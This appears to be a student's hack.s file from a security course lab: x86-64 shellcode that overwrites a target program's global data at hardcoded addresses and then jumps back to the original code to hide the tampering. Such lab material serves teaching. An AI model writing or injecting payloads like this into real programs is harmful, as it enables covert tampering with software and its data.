# Sometimes its easier to create x86 assembler code in a file like this hack.s file
# The Makefile has a command to assemble this file and produce a hack.o file that has
# the binary instructions.
# 
# Use "objdump -d hack.o" to disassemble these instructions
# Use "objdump -h -j.text" to show exactly where these binary instruction are within the hack.o file
#
# Put your x86 assembler code below....
pop %rbp
push %rax
push %rsi
push %rdi
mov $0x64, %rdi
mov $11, %rbx
sub $1, %rbx
mov $0x603cc0, %rsi
mov $0, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %rbx, 40(%rsi,%rax,4)
add $100, %rax
mov %rbx, 40(%rsi,%rax,4)
add $100, %rax
mov %rbx, 40(%rsi,%rax,4)
add $100, %rax
mov %rbx, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
mov %edi, 40(%rsi,%rax,4)
add $100, %rax
pop %rdi
pop %rsi
pop %rax
mov $0x400969, %rbx
jmp *%rbx



